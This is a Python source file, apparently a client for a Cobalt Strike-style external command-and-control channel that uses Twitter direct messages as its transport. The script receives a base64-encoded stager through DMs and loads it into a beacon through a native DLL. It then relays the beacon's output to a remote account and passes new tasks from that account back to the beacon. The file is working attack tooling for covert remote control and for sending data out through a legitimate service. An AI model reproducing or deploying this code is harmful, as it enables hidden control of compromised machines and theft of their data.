from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:
import base64

# transport imports:
import tweepy
from time import sleep

# START GHETTO ASS CONFIG, should be read in when compiled...
CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
	return base64.b64encode(data)

def decode(data):
	return base64.b64decode(data)
# </encoder functions>


# <transport functions>
def prepTransport():
	global api

	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

	# Construct the api instance
	api = tweepy.API(auth)

def sendData(data):
	encoded_data = encode(data)
	if len(encoded_data) > 10000:
		dataArray = [encoded_data[i:i + 6000] for i in range(0, len(encoded_data), 6000)]
		for chunk in dataArray:
			api.send_direct_message(user=USERNAME, text=chunk)
			sleep(0.1)
	else:
		api.send_direct_message(user=USERNAME, text=encoded_data)

def recvData():
	data = ""
	for message in api.direct_messages(count=1000, full_text="true"):
		if (message.sender_screen_name == USERNAME):
			try:
				data += message.text # ignore the frame size
			except:
				data += None
				pass
	decoded_data = decode(data)
	return decoded_data

# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	sleep(2)
	# print "Decoded stager = " + str(p) # DEBUG
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	sys.exit(0)
